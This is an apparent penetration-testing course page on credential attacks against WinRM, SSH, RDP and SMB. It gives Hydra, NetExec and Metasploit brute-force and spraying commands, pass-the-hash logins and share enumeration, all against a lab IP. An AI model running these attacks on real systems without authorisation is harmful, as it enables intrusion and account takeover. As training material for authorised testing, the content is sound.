# Network Services

Network services such as WinRM, SSH, RDP, and SMB are present in virtually every enterprise environment and represent high-value attack targets during a penetration test. Each service exposes an authentication endpoint that can be subjected to password spraying or brute-force attacks to recover valid credentials, which can then be used to establish interactive sessions, enumerate shares, or pivot deeper into the network.

## The General Approach

Online attacks against network services differ fundamentally from offline hash cracking. Every authentication attempt is sent across the network to a live service, which means:

- **Speed is limited** by network latency and the service's ability to handle concurrent connections, not by hardware
- **Account lockout policies** can disable targeted accounts if too many failed attempts are made in a short window
- **Logging and detection** are highly likely — every failed login generates an event log entry on the target

Password **spraying** (one password tested against many accounts) is almost always preferable to brute-forcing a single account, as it minimises the risk of triggering lockouts while still exploiting the statistical likelihood that at least one user in a large organisation uses a predictable password.

## NetExec

[NetExec](https://github.com/Pennyw0rth/NetExec) (abbreviated `nxc`) is the modern successor to CrackMapExec and is the primary tool for authenticated and unauthenticated interaction with network services during an assessment. It supports SMB, WinRM, RDP, SSH, LDAP, MSSQL, WMI, VNC, FTP, and NFS from a single unified interface. Its general syntax is:

```bash
netexec <protocol> <target> -u <user or userlist> -p <password or passwordlist>
```

Key flags used across all protocols:

| Flag | Description |
|---|---|
| `-u` | Username or file containing usernames |
| `-p` | Password or file containing passwords |
| `-H` | NTLM hash (for Pass-the-Hash) |
| `-d` | Domain name |
| `--local-auth` | Authenticate against local accounts rather than domain |
| `--no-bruteforce` | Test each username against its corresponding password (1:1 pairing, not all combinations) — useful for spraying |
| `--continue-on-success` | Keep trying after a valid credential is found |

## WinRM

[Windows Remote Management](https://docs.microsoft.com/en-us/windows/win32/winrm/portal) (WinRM) is Microsoft's implementation of the WS-Management protocol, providing remote PowerShell access to Windows systems over TCP ports **5985** (HTTP) and **5986** (HTTPS). It communicates over SOAP/XML and integrates with WMI and DCOM to allow full remote management capability. WinRM is not enabled by default on workstations but is commonly enabled on servers and domain controllers in managed environments.

Credential testing against WinRM with NetExec:

```bash
netexec winrm 10.129.42.197 -u user.list -p password.list

WINRM  10.129.42.197  5985  NONE  [*] http://10.129.42.197:5985/wsman
WINRM  10.129.42.197  5985  NONE  [+] None\user:password (Pwn3d!)
```

The `(Pwn3d!)` marker indicates the authenticated user has sufficient privileges to execute commands via WinRM — not just authenticate. Once valid credentials are confirmed, [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) provides a full interactive PowerShell session:

```bash
sudo gem install evil-winrm
evil-winrm -i 10.129.42.197 -u user -p password

*Evil-WinRM* PS C:\Users\user\Documents>
```

Evil-WinRM establishes the session using the [PowerShell Remoting Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-psrp/602ee78e-9a19-45ad-90fa-bb132b7cecec) (MS-PSRP) and supports features including file upload/download, in-memory script execution, pass-the-hash authentication, and loading of PowerShell scripts directly into the session.

## SSH

[Secure Shell](https://www.ssh.com/academy/ssh/protocol) (SSH) runs on TCP port **22** by default and is the standard remote management protocol for Linux and Unix-based systems. SSH uses three cryptographic mechanisms in combination to provide a secure channel:

- **Symmetric encryption** — encrypts the session data using a shared session key negotiated via the [Diffie-Hellman key exchange](https://en.wikipedia.org/wiki/Diffie%E2%80%93Hellman_key_exchange). Algorithms include AES, ChaCha20, and 3DES.
- **Asymmetric encryption** — used during the initial key exchange and for public key authentication. The server's host key is used to authenticate the server to the client, preventing man-in-the-middle attacks on first connection.
- **Hashing** — HMAC algorithms (SHA-256, SHA-512) verify message integrity on each transmitted packet, ensuring data has not been tampered with in transit.

SSH services can be brute-forced using [Hydra](https://github.com/vanhauser-thc/thc-hydra), though many production SSH configurations rate-limit connections and may temporarily ban source IPs after repeated failures:

```bash
hydra -L user.list -P password.list ssh://10.129.42.197

[22][ssh] host: 10.129.42.197   login: user   password: password
1 of 1 target successfully completed, 1 valid password found
```

> **Note:** Hydra recommends reducing parallel tasks for SSH with `-t 4`, as many SSH server configurations limit concurrent connection attempts from the same source.

Once valid credentials are recovered, a standard connection is made with the system's OpenSSH client:

```bash
ssh user@10.129.42.197
```

## RDP

Microsoft's [Remote Desktop Protocol](https://docs.microsoft.com/en-us/troubleshoot/windows-server/remote/understanding-remote-desktop-protocol) (RDP) operates on TCP port **3389** by default and provides a full graphical remote desktop session to Windows systems. It is used by administrators, support staff, and end users for remote access and transmits display output, keyboard input, audio, printer redirection, and clipboard data between the terminal client and server.

Hydra supports RDP brute-forcing, though the protocol is sensitive to parallel connections and requires reduced thread counts:

```bash
hydra -L user.list -P password.list rdp://10.129.42.197

[3389][rdp] account on 10.129.42.197 might be valid but account not active for remote desktop: login: mrb3n password: rockstar
[3389][rdp] host: 10.129.42.197   login: user   password: password
```

It is important to note that valid credentials do not guarantee RDP access. A user must be a member of the **Remote Desktop Users** or **Administrators** group on the target system for RDP to succeed. NetExec's RDP module is also useful here, as it can validate credentials without fully establishing a session.

On Linux, [xfreerdp](https://linux.die.net/man/1/xfreerdp) provides a full RDP client for connecting to Windows targets:

```bash
xfreerdp /v:10.129.42.197 /u:user /p:password
```

xfreerdp also supports Pass-the-Hash for RDP authentication where Restricted Admin Mode is enabled on the target:

```bash
xfreerdp /v:10.129.42.197 /u:administrator /pth:<NTLM_HASH> /cert:ignore
```

## SMB

[Server Message Block](https://docs.microsoft.com/en-us/windows/win32/fileio/microsoft-smb-protocol-and-cifs-protocol-overview) (SMB) operates over TCP ports **445** (direct) and **139** (NetBIOS) and is the primary file and printer sharing protocol in Windows networks. It is also implemented on Linux and macOS through [Samba](https://wiki.samba.org/index.php/Main_Page), making it ubiquitous across mixed-OS environments.

Hydra can perform SMB brute-forcing, but forces single-threaded operation because SMB does not tolerate parallel connections:

```bash
hydra -L user.list -P password.list smb://10.129.42.197

[445][smb] host: 10.129.42.197   login: user   password: password
```

If Hydra returns an `[ERROR] invalid reply from target` message, this is typically caused by an outdated version of Hydra that cannot handle SMBv3 responses. The Metasploit `smb_login` auxiliary module handles this reliably:

```bash
msf6 > use auxiliary/scanner/smb/smb_login
msf6 auxiliary(scanner/smb/smb_login) > set user_file user.list
msf6 auxiliary(scanner/smb/smb_login) > set pass_file password.list
msf6 auxiliary(scanner/smb/smb_login) > set rhosts 10.129.42.197
msf6 auxiliary(scanner/smb/smb_login) > run

[+] 10.129.42.197:445 - Success: '.\user:password'
```

### Post-Authentication Enumeration

Once valid SMB credentials are obtained, NetExec is used to enumerate shares and permissions:

```bash
netexec smb 10.129.42.197 -u "user" -p "password" --shares

SMB  10.129.42.197  445  WINSRV  [+] WINSRV\user:password
SMB  10.129.42.197  445  WINSRV  Share           Permissions     Remark
SMB  10.129.42.197  445  WINSRV  ADMIN$                          Remote Admin
SMB  10.129.42.197  445  WINSRV  C$                              Default share
SMB  10.129.42.197  445  WINSRV  SHARENAME       READ,WRITE
SMB  10.129.42.197  445  WINSRV  IPC$            READ            Remote IPC
```

[Smbclient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html) then provides interactive access to share contents, file uploads, and downloads:

```bash
smbclient -U user \\\\10.129.42.197\\SHARENAME
Enter WORKGROUP\user's password:

smb: \> ls
```

## Protocol and Tool Reference

| Protocol | Default Port | Brute-Force Tool | Session Tool |
|---|---|---|---|
| WinRM | 5985/5986 | NetExec | Evil-WinRM |
| SSH | 22 | Hydra (`-t 4`) | `ssh` (OpenSSH) |
| RDP | 3389 | Hydra (`-t 1`/`-t 4`) | `xfreerdp`, Remmina |
| SMB | 445 | Hydra / Metasploit `smb_login` | `smbclient`, NetExec |
| MSSQL | 1433 | NetExec | `mssqlclient.py` (Impacket) |
| LDAP | 389/636 | NetExec | `ldapsearch`, AD Explorer |
| VNC | 5900 | Hydra | `vncviewer` |
| FTP | 21 | Hydra | `ftp`, `lftp` |
